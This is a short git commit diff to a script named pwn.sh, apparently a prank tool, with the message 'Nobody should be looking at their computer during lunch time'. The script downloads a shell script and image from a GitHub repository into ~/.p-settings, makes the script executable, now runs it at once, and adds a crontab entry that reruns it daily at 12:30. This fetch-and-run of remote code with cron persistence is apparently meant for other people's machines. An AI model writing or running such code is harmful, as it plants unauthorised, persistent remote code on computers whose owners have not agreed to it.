31cc8595cdd0d80f8102844e7f63bb13ec0acfac
Josh Eversmann <josh.eversmann@gmail.com>
2016-06-25 15:44:13 -0500

    Nobody should be looking at their computer during lunch time

--- pwn.sh
+++ pwn.sh
@@ -5,7 +5,8 @@ cd ~/.p-settings
 curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.sh
 curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.jpg
 chmod +x pwny.sh
+./pwny.sh
 cd -
 
-line="* * * * * ~/.p-settings/pwny.sh"
+line="30 12 * * * ~/.p-settings/pwny.sh"
 (crontab -l; echo "$line" ) | crontab -
